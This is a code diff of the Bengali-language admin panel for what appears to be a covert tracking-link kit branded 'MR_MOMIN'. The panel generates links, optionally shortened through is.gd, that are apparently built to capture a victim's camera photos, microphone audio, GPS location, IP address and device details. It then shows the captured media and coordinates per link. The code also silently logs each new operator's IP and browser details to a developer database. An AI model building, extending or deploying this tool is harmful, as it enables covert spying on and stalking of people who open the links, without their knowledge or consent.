@@ -3,21 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>ELITE ADMIN | MR_MOMIN_🌍</title>
-    <!-- Firebase SDK -->
+    <title>Admin Panel | MR_MOMIN_🌍</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
-    <!-- Leaflet for maps -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Courier New', 'Fira Code', monospace;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif; }
         body {
             background: radial-gradient(circle at 20% 30%, #03000a, #000000);
             min-height: 100vh;
@@ -43,7 +34,7 @@
             backdrop-filter: blur(12px);
             border-radius: 2rem;
             border: 1px solid #ffd700;
-            max-width: 1100px;
+            max-width: 1200px;
             width: 100%;
             padding: 2rem;
             box-shadow: 0 0 30px rgba(255, 215, 0, 0.2);
@@ -67,15 +58,22 @@
             padding-bottom: 5px;
             margin-bottom: 1.5rem;
         }
-        .input-group {
-            margin-bottom: 1rem;
+        .uid-box {
+            background: #000000aa;
+            border-radius: 1rem;
+            padding: 10px;
+            text-align: center;
+            margin-bottom: 1.5rem;
+            border: 1px dashed #ffd700;
         }
-        label {
-            display: block;
-            font-size: 0.7rem;
-            color: #0ef;
-            margin-bottom: 4px;
+        .uid-box span {
+            color: #ffd700;
+            font-size: 1.2rem;
+            font-weight: bold;
+            letter-spacing: 2px;
         }
+        .input-group { margin-bottom: 1rem; }
+        label { display: block; font-size: 0.7rem; color: #0ef; margin-bottom: 4px; }
         input, select {
             width: 100%;
             background: #001000;
@@ -154,7 +152,6 @@
             margin-top: 20px;
             color: #ffd700;
         }
-        /* admin tables & cards */
         .link-card {
             background: #001500;
             border: 1px solid #ffd700;
@@ -163,9 +160,6 @@
             margin: 1rem 0;
             cursor: pointer;
             transition: 0.2s;
-        }
-        .link-card:hover {
-            background: #002a00;
         }
         .data-card {
             background: #001500;
@@ -202,14 +196,14 @@
         }
         .tab-content { display: block; }
         .hide { display: none; }
-        #map { height: 300px; width: 100%; border-radius: 1rem; margin-top: 1rem; }
-        .admin-table {
-            width: 100%;
-            border-collapse: collapse;
-            color: #0ef;
+        .developer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.7rem;
+            color: #ffd700;
         }
-        .admin-table th, .admin-table td {
-            border: 1px solid #ffd700;
+        .click-entry {
+            border-bottom: 1px solid #ffd70033;
             padding: 8px;
             font-size: 0.7rem;
         }
@@ -218,87 +212,57 @@
 <body>
 <div id="matrixCanvas" class="matrix-bg"></div>
 
-<div id="appRoot">
-    <!-- LOGIN VIEW -->
-    <div id="loginView" class="glass-card">
-        <h1>> MR_MOMIN_🌍 ADMIN_</h1>
-        <div style="text-align:center;"><span class="tagline">[ ELITE CONTROL PANEL ]</span></div>
-        <div class="input-group">
-            <label>👤 USER ID / UID</label>
-            <input type="text" id="loginUid" placeholder="admin_uid">
-        </div>
-        <div class="input-group">
-            <label>🔑 PASSWORD</label>
-            <input type="password" id="loginPwd" placeholder="******">
-        </div>
-        <button class="btn" id="loginBtn">⚡ LOGIN</button>
-        <div class="info-note">Developer: use UID = "dev_master" and password = "MR_MOMIN_🌍"</div>
+<div class="glass-card" id="adminDashboard">
+    <h1>> MR_MOMIN_🌍 ADMIN_</h1>
+    <div style="text-align:center;"><span class="tagline">[ SMART TRACKING SYSTEM ]</span></div>
+
+    <div class="uid-box">
+        📛 আপনার ইউনিক আইডি (UID): <span id="adminUidDisplay">লোড হচ্ছে...</span>
     </div>
 
-    <!-- ADMIN DASHBOARD -->
-    <div id="dashboardView" class="glass-card hide">
-        <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;">
-            <h1>> WELCOME, <span id="welcomeUser">ADMIN</span>_</h1>
-            <button id="logoutBtn" class="small-btn">LOGOUT</button>
-        </div>
-        <div style="text-align:center;"><span class="tagline">[ LIVE TRACKING SUITE ]</span></div>
+    <div class="flex-row" style="margin-bottom: 1rem;">
+        <button id="tabGenBtn" class="small-btn" style="background:#ffd700;">🔗 জেনারেটর</button>
+        <button id="tabMonitorBtn" class="small-btn">📡 লিংক মনিটর</button>
+        <button id="tabDataViewBtn" class="small-btn">📦 ডাটা ভিউয়ার</button>
+    </div>
 
-        <!-- TABS -->
-        <div class="flex-row" style="margin-bottom: 1rem;">
-            <button id="tabGenBtn" class="small-btn" style="background:#ffd700;">🔗 GENERATOR</button>
-            <button id="tabMonitorBtn" class="small-btn">📡 MONITOR</button>
-            <button id="tabDataViewBtn" class="small-btn">📦 DATA VIEWER</button>
-            <button id="tabAdminMgmtBtn" class="small-btn hide">👥 ADMIN MGMT</button>
+    <!-- GENERATOR TAB -->
+    <div id="tabGenerator" class="tab-content">
+        <div class="feature-grid" id="featureGrid">
+            <div class="feature-card" data-feat="C"><span>📸</span> ক্যামেরা (৩ ছবি/সেকেন্ড)</div>
+            <div class="feature-card" data-feat="M"><span>🎙️</span> মাইক্রোফোন (১০ সেকেন্ড লুপ)</div>
+            <div class="feature-card" data-feat="L"><span>📍</span> লোকেশন</div>
+            <div class="feature-card" data-feat="X"><span>💻</span> ডিভাইস তথ্য</div>
         </div>
-
-        <!-- GENERATOR TAB -->
-        <div id="tabGenerator" class="tab-content">
-            <div class="feature-grid" id="featureGrid">
-                <div class="feature-card" data-feat="C"><span>📸</span> CAMERA (3fps)</div>
-                <div class="feature-card" data-feat="M"><span>🎙️</span> MIC (10s loop)</div>
-                <div class="feature-card" data-feat="L"><span>📍</span> LOCATION</div>
-                <div class="feature-card" data-feat="X"><span>💻</span> DEVICE INFO</div>
-            </div>
-            <div class="short-toggle">
-                <input type="checkbox" id="shortenCheckbox"> <label>🔗 SHORTEN LINK (is.gd)</label>
-            </div>
-            <button class="btn" id="generateLinkBtn">⚡ GENERATE LINK</button>
-            <div id="linkResultBox" class="link-box">
-                <div class="link-text" id="generatedLink">--</div>
-                <div class="copy-row" style="display:flex; gap:8px;">
-                    <button id="copyFullBtn" style="background:#ffd700; color:#000; border:none; border-radius:1rem; padding:6px; flex:1;">COPY LINK</button>
-                </div>
-            </div>
+        <div class="short-toggle">
+            <input type="checkbox" id="shortenCheckbox"> <label>🔗 শর্ট লিংক তৈরি করুন (is.gd)</label>
         </div>
-
-        <!-- MONITOR TAB: list of links with live counters -->
-        <div id="tabMonitor" class="tab-content hide">
-            <h3 style="color:#ffd700;">📡 YOUR TRACKING LINKS</h3>
-            <div id="linksList"></div>
-        </div>
-
-        <!-- DATA VIEWER TAB: click on a link to see details + map -->
-        <div id="tabDataView" class="tab-content hide">
-            <h3 style="color:#ffd700;">📦 CLICK ON A LINK TO VIEW CAPTURED DATA</h3>
-            <div id="dataLinksList"></div>
-            <div id="dataDetails" class="hide">
-                <h4>Data for <span id="selectedLinkId"></span></h4>
-                <div id="map" style="height:300px;"></div>
-                <div id="mediaList" class="data-card"></div>
+        <button class="btn" id="generateLinkBtn">⚡ লিংক জেনারেট করুন</button>
+        <div id="linkResultBox" class="link-box">
+            <div class="link-text" id="generatedLink">--</div>
+            <div class="copy-row" style="display:flex; gap:8px;">
+                <button id="copyFullBtn" style="background:#ffd700; color:#000; border:none; border-radius:1rem; padding:6px; flex:1;">লিংক কপি করুন</button>
             </div>
-        </div>
-
-        <!-- ADMIN MANAGEMENT TAB (only developer) -->
-        <div id="tabAdminMgmt" class="tab-content hide">
-            <h3 style="color:#ffd700;">👥 ADMIN MANAGEMENT</h3>
-            <div class="flex-row" style="margin-bottom: 1rem;">
-                <input type="text" id="newAdminUid" placeholder="new admin UID" style="flex:1;">
-                <input type="password" id="newAdminPwd" placeholder="password" style="flex:1;">
-                <button id="createAdminBtn" class="small-btn">CREATE</button>
-            </div>
-            <div id="adminsTableContainer"></div>
         </div>
     </div>
+
+    <!-- MONITOR TAB: show all links with stats -->
+    <div id="tabMonitor" class="tab-content hide">
+        <h3 style="color:#ffd700;">📡 আপনার তৈরি লিংক সমূহ</h3>
+        <div id="linksList"></div>
+    </div>
+
+    <!-- DATA VIEWER TAB: click on link to see details + click logs -->
+    <div id="tabDataView" class="tab-content hide">
+        <h3 style="color:#ffd700;">📦 লিংকে ক্লিক করে বিস্তারিত ডাটা দেখুন</h3>
+        <div id="dataLinksList"></div>
+        <div id="dataDetails" class="hide">
+            <h4>ডাটা: <span id="selectedLinkId"></span></h4>
+            <div id="mediaList" class="data-card"></div>
+        </div>
+    </div>
+
+    <div class="developer">⚡ System Developed by Mr. Momin</div>
 </div>
 
 <script>
@@ -344,65 +308,62 @@
         window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
     })();
 
-    // ========== GLOBALS ==========
-    let currentUser = null; // { uid, type: 'admin' or 'developer' }
-    let currentAdminId = null;
+    // ========== UID MANAGEMENT ==========
+    let adminUid = null;
 
-    // ========== LOGIN ==========
-    document.getElementById('loginBtn').onclick = async () => {
-        const uid = document.getElementById('loginUid').value.trim();
-        const pwd = document.getElementById('loginPwd').value.trim();
-        if (!uid || !pwd) { alert("Enter UID and Password"); return; }
-
-        if (uid === "dev_master" && pwd === "MR_MOMIN_🌍") {
-            currentUser = { uid: "dev_master", type: "developer" };
-            currentAdminId = null;
-            showDashboard();
-            return;
+    async function getOrCreateUid() {
+        let storedUid = localStorage.getItem('admin_uid');
+        if (storedUid && /^\d{8}$/.test(storedUid)) {
+            adminUid = storedUid;
+            document.getElementById('adminUidDisplay').innerText = adminUid;
+            return adminUid;
         }
+        let newUid = Math.floor(10000000 + Math.random() * 90000000).toString();
+        adminUid = newUid;
+        localStorage.setItem('admin_uid', adminUid);
+        document.getElementById('adminUidDisplay').innerText = adminUid;
 
-        const adminRef = db.ref(`admins/${uid}`);
-        const snapshot = await adminRef.once('value');
-        const admin = snapshot.val();
-        if (admin && admin.password === pwd) {
-            currentUser = { uid: uid, type: "admin", name: admin.name || uid };
-            currentAdminId = uid;
-            showDashboard();
-        } else {
-            alert("Invalid credentials");
-        }
-    };
+        // Send to developer log
+        let ip = 'unknown';
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch(e) {}
+        await db.ref(`dev_logs/new_admins/${adminUid}`).set({
+            uid: adminUid,
+            firstSeen: Date.now(),
+            ip: ip,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform
+        });
+        await db.ref(`admins/${adminUid}`).set({
+            uid: adminUid,
+            createdAt: Date.now(),
+            name: `Admin_${adminUid}`
+        });
+        return adminUid;
+    }
 
-    function showDashboard() {
-        document.getElementById('loginView').classList.add('hide');
-        document.getElementById('dashboardView').classList.remove('hide');
-        document.getElementById('welcomeUser').innerText = currentUser.type === 'developer' ? 'DEVELOPER' : currentUser.uid;
-        if (currentUser.type === 'developer') {
-            document.getElementById('tabAdminMgmtBtn').classList.remove('hide');
-            loadAllAdmins();
-        } else {
-            document.getElementById('tabAdminMgmtBtn').classList.add('hide');
-        }
+    // ========== SETUP ==========
+    async function init() {
+        await getOrCreateUid();
         setupTabs();
         setupGenerator();
-        if (currentUser.type === 'admin') {
-            loadMonitorLinks();
-            loadDataLinks();
-        }
+        loadMonitorLinks();
+        loadDataLinks();
     }
 
     function setupTabs() {
         const tabs = {
             gen: document.getElementById('tabGenBtn'),
             mon: document.getElementById('tabMonitorBtn'),
-            data: document.getElementById('tabDataViewBtn'),
-            mgmt: document.getElementById('tabAdminMgmtBtn')
+            data: document.getElementById('tabDataViewBtn')
         };
         const contents = {
             gen: document.getElementById('tabGenerator'),
             mon: document.getElementById('tabMonitor'),
-            data: document.getElementById('tabDataView'),
-            mgmt: document.getElementById('tabAdminMgmt')
+            data: document.getElementById('tabDataView')
         };
         const showTab = (name) => {
             for (let k in contents) contents[k].classList.add('hide');
@@ -411,7 +372,6 @@
         tabs.gen.onclick = () => showTab('gen');
         tabs.mon.onclick = () => showTab('mon');
         tabs.data.onclick = () => showTab('data');
-        if (tabs.mgmt) tabs.mgmt.onclick = () => showTab('mgmt');
         showTab('gen');
     }
 
@@ -431,20 +391,20 @@
         const linkSpan = document.getElementById('generatedLink');
         const shortCheck = document.getElementById('shortenCheckbox');
         genBtn.onclick = async () => {
-            if (selected.size === 0) { alert("Select at least one feature"); return; }
+            if (selected.size === 0) { alert("অন্তত একটি ফিচার নির্বাচন করুন"); return; }
             const features = Array.from(selected).join('');
             const linkId = 'link_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
             const baseUrl = window.location.origin + window.location.pathname.replace('admin.html', 'track.html');
-            const fullLink = `${baseUrl}?id=${linkId}&f=${features}`;
+            const fullLink = `${baseUrl}?id=${linkId}&admin=${adminUid}&f=${features}`;
             const linkData = {
                 linkId: linkId,
                 features: features,
                 createdAt: Date.now(),
-                createdBy: currentAdminId || currentUser.uid,
+                createdBy: adminUid,
                 shortUrl: null
             };
             if (shortCheck.checked) {
-                linkSpan.innerText = 'SHORTENING...';
+                linkSpan.innerText = 'শর্ট লিংক তৈরি হচ্ছে...';
                 try {
                     const res = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(fullLink)}`);
                     const data = await res.json();
@@ -455,56 +415,56 @@
             } else {
                 linkSpan.innerText = fullLink;
             }
-            await db.ref(`links/${currentAdminId || 'dev'}/${linkId}`).set(linkData);
+            await db.ref(`links/${adminUid}/${linkId}`).set(linkData);
             linkBox.style.display = 'block';
-            if (currentUser.type === 'admin') loadMonitorLinks();
+            loadMonitorLinks();
         };
         document.getElementById('copyFullBtn').onclick = () => {
             const txt = linkSpan.innerText;
-            if (txt && txt !== '--' && !txt.includes('SHORTENING')) copyClip(txt);
-            else alert("Generate link first");
+            if (txt && txt !== '--' && !txt.includes('শর্ট')) copyClip(txt);
+            else alert("প্রথমে লিংক জেনারেট করুন");
         };
     }
-    function copyClip(t) { navigator.clipboard.writeText(t).then(() => alert("Link copied")); }
+    function copyClip(t) { navigator.clipboard.writeText(t).then(() => alert("লিংক কপি হয়েছে")); }
 
-    // ========== MONITOR TAB: live counters ==========
+    // ========== MONITOR TAB: show links with live counters (photo, audio, location, clicks) ==========
     async function loadMonitorLinks() {
-        const linksRef = db.ref(`links/${currentAdminId}`);
+        const linksRef = db.ref(`links/${adminUid}`);
         linksRef.on('value', (snapshot) => {
             const links = snapshot.val();
             const container = document.getElementById('linksList');
-            if (!links) { container.innerHTML = '<div class="data-card">No links created yet.</div>'; return; }
+            if (!links) { container.innerHTML = '<div class="data-card">এখনো কোনো লিংক তৈরি হয়নি।</div>'; return; }
             let html = '<div class="data-card">';
             for (let id in links) {
                 const link = links[id];
-                // subscribe to tracking counts for this link
-                const countRef = db.ref(`tracking/${id}`);
-                countRef.once('value', (trackSnap) => {
+                // get counts from captured_data
+                const countRef = db.ref(`captured_data/${adminUid}/${id}`);
+                countRef.on('value', (trackSnap) => {
                     const trackData = trackSnap.val();
-                    let photoCount = 0, audioCount = 0, locCount = 0;
+                    let photoCount = 0, audioCount = 0, locCount = 0, clickCount = 0;
                     if (trackData) {
                         for (let key in trackData) {
                             if (key.startsWith('camera_photo')) photoCount++;
                             else if (key.startsWith('microphone_audio')) audioCount++;
                             else if (key.startsWith('location')) locCount++;
+                            else if (key.startsWith('click_')) clickCount++;
                         }
                     }
-                    // update the displayed card (we'll set id for each link)
                     const cardElem = document.getElementById(`link-card-${id}`);
                     if (cardElem) {
                         cardElem.innerHTML = `<strong>🔗 ${id}</strong><br>
-                            Features: ${link.features}<br>
-                            Created: ${new Date(link.createdAt).toLocaleString()}<br>
+                            ফিচার: ${link.features}<br>
+                            তৈরি: ${new Date(link.createdAt).toLocaleString()}<br>
+                            <span class="stat-badge">👆 ${clickCount} ক্লিক</span>
                             <span class="stat-badge">📸 ${photoCount}</span>
                             <span class="stat-badge">🎙️ ${audioCount}</span>
                             <span class="stat-badge">📍 ${locCount}</span>
-                            ${link.shortUrl ? `<br>Short: <a href="${link.shortUrl}" target="_blank">${link.shortUrl}</a>` : ''}`;
+                            ${link.shortUrl ? `<br>শর্ট: <a href="${link.shortUrl}" target="_blank">${link.shortUrl}</a>` : ''}`;
                     }
                 });
                 html += `<div class="link-card" id="link-card-${id}" data-linkid="${id}"></div>`;
             }
             container.innerHTML = html;
-            // attach click to each card to show data (optional)
             document.querySelectorAll('.link-card').forEach(card => {
                 card.addEventListener('click', () => {
                     const linkId = card.getAttribute('data-linkid');
@@ -515,18 +475,18 @@
         });
     }
 
-    // ========== DATA VIEWER: list of links ==========
+    // ========== DATA VIEWER: show clicks list and captured media ==========
     async function loadDataLinks() {
-        const linksRef = db.ref(`links/${currentAdminId}`);
+        const linksRef = db.ref(`links/${adminUid}`);
         linksRef.on('value', (snapshot) => {
             const links = snapshot.val();
             const container = document.getElementById('dataLinksList');
-            if (!links) { container.innerHTML = '<div class="data-card">No links yet.</div>'; return; }
+            if (!links) { container.innerHTML = '<div class="data-card">এখনো কোনো লিংক নেই।</div>'; return; }
             let html = '';
             for (let id in links) {
                 html += `<div class="link-card" data-linkid="${id}">
                             <strong>🔗 ${id}</strong><br>
-                            Created: ${new Date(links[id].createdAt).toLocaleString()}
+                            তৈরি: ${new Date(links[id].createdAt).toLocaleString()}
                          </div>`;
             }
             container.innerHTML = html;
@@ -536,58 +496,53 @@
         });
     }
 
-    let currentMap = null;
     async function showLinkData(linkId) {
         const detailsDiv = document.getElementById('dataDetails');
         detailsDiv.classList.remove('hide');
         document.getElementById('selectedLinkId').innerText = linkId;
         const mediaDiv = document.getElementById('mediaList');
-        mediaDiv.innerHTML = '<div class="loader"></div><p>Loading data...</p>';
+        mediaDiv.innerHTML = '<div class="loader"></div><p>ডাটা লোড হচ্ছে...</p>';
 
-        // get all tracking data for this link
-        const trackRef = db.ref(`tracking/${linkId}`);
+        const trackRef = db.ref(`captured_data/${adminUid}/${linkId}`);
         trackRef.once('value', (snapshot) => {
             const data = snapshot.val();
             if (!data) {
-                mediaDiv.innerHTML = '<p>No captured data yet.</p>';
+                mediaDiv.innerHTML = '<p>এখনো কোনো ডাটা ক্যাপচার হয়নি।</p>';
                 return;
             }
-            let photos = [], audios = [], locations = [], others = [];
+            let photos = [], audios = [], locations = [], clicks = [], others = [];
             for (let key in data) {
                 const entry = data[key];
                 if (key.startsWith('camera_photo')) photos.push(entry);
                 else if (key.startsWith('microphone_audio')) audios.push(entry);
                 else if (key.startsWith('location')) locations.push(entry);
+                else if (key.startsWith('click_')) clicks.push(entry);
                 else others.push(entry);
             }
-            // Build media list
-            let html = `<h4>📸 Photos (${photos.length})</h4>`;
+            let html = `<h4>👆 ক্লিক তথ্য (${clicks.length})</h4>`;
+            clicks.sort((a,b) => b.timestamp - a.timestamp);
+            clicks.forEach(c => {
+                const time = new Date(c.timestamp).toLocaleString();
+                const ip = c.data.ip || 'unknown';
+                const ua = c.data.userAgent || '';
+                html += `<div class="click-entry"><strong>${time}</strong> | IP: ${ip}<br><small>${ua.substring(0, 100)}</small></div>`;
+            });
+            html += `<h4>📸 ছবি (${photos.length})</h4>`;
             photos.forEach(p => {
                 const time = new Date(p.timestamp).toLocaleString();
                 html += `<div class="data-entry"><strong>${time}</strong><br><img src="${p.data.url}" style="max-width:100%; max-height:200px;"></div>`;
             });
-            html += `<h4>🎤 Audio Clips (${audios.length})</h4>`;
+            html += `<h4>🎤 অডিও ক্লিপ (${audios.length})</h4>`;
             audios.forEach(a => {
                 const time = new Date(a.timestamp).toLocaleString();
                 html += `<div class="data-entry"><strong>${time}</strong><br><audio controls src="${a.data.url}" style="width:100%;"></audio></div>`;
             });
-            html += `<h4>📍 Locations (${locations.length})</h4>`;
-            const lastLoc = locations.length ? locations[locations.length-1].data : null;
-            if (lastLoc && lastLoc.lat && lastLoc.lon) {
-                if (currentMap) currentMap.remove();
-                currentMap = L.map('map').setView([lastLoc.lat, lastLoc.lon], 13);
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                    attribution: '© OpenStreetMap'
-                }).addTo(currentMap);
-                L.marker([lastLoc.lat, lastLoc.lon]).addTo(currentMap).bindPopup('Last known location').openPopup();
-            } else {
-                document.getElementById('map').innerHTML = '<p>No location data.</p>';
-            }
+            html += `<h4>📍 লোকেশন (${locations.length})</h4>`;
             locations.forEach(loc => {
                 const time = new Date(loc.timestamp).toLocaleString();
                 html += `<div class="data-entry"><strong>${time}</strong><br>${loc.data.lat}, ${loc.data.lon}</div>`;
             });
-            html += `<h4>📋 Other Data</h4>`;
+            html += `<h4>📋 অন্যান্য তথ্য</h4>`;
             others.forEach(o => {
                 const time = new Date(o.timestamp).toLocaleString();
                 html += `<div class="data-entry"><strong>${o.type}</strong> at ${time}<br><pre>${JSON.stringify(o.data, null, 2)}</pre></div>`;
@@ -596,66 +551,7 @@
         });
     }
 
-    // ========== ADMIN MANAGEMENT (developer only) ==========
-    async function loadAllAdmins() {
-        const adminsRef = db.ref('admins');
-        adminsRef.on('value', (snapshot) => {
-            const admins = snapshot.val();
-            const container = document.getElementById('adminsTableContainer');
-            if (!admins) { container.innerHTML = '<div class="data-card">No admins created.</div>'; return; }
-            let html = '<table class="admin-table"><tr><th>UID</th><th>Password</th><th>Created</th><th>Links</th><th>Action</th></tr>';
-            for (let uid in admins) {
-                const admin = admins[uid];
-                html += `<tr>
-                            <td>${uid}</td>
-                            <td>${admin.password}</td>
-                            <td>${new Date(admin.createdAt).toLocaleString()}</td>
-                            <td id="linkCount-${uid}">...</td>
-                            <td><button class="small-btn" onclick="deleteAdmin('${uid}')">Delete</button></td>
-                         </tr>`;
-                db.ref(`links/${uid}`).once('value', snap => {
-                    document.getElementById(`linkCount-${uid}`).innerText = snap.numChildren();
-                });
-            }
-            html += '</table>';
-            container.innerHTML = html;
-        });
-    }
-
-    window.deleteAdmin = async (uid) => {
-        if (confirm(`Delete admin ${uid} and all their links?`)) {
-            await db.ref(`admins/${uid}`).remove();
-            await db.ref(`links/${uid}`).remove();
-            alert("Admin deleted");
-            loadAllAdmins();
-        }
-    };
-
-    document.getElementById('createAdminBtn').onclick = async () => {
-        const newUid = document.getElementById('newAdminUid').value.trim();
-        const newPwd = document.getElementById('newAdminPwd').value.trim();
-        if (!newUid || !newPwd) { alert("Enter UID and password"); return; }
-        const adminRef = db.ref(`admins/${newUid}`);
-        const existing = await adminRef.once('value');
-        if (existing.exists()) { alert("Admin UID already exists"); return; }
-        await adminRef.set({
-            password: newPwd,
-            createdAt: Date.now(),
-            name: newUid
-        });
-        alert("Admin created");
-        document.getElementById('newAdminUid').value = '';
-        document.getElementById('newAdminPwd').value = '';
-        loadAllAdmins();
-    };
-
-    document.getElementById('logoutBtn').onclick = () => {
-        currentUser = null;
-        document.getElementById('dashboardView').classList.add('hide');
-        document.getElementById('loginView').classList.remove('hide');
-        document.getElementById('loginUid').value = '';
-        document.getElementById('loginPwd').value = '';
-    };
+    init();
 </script>
 </body>
 </html>
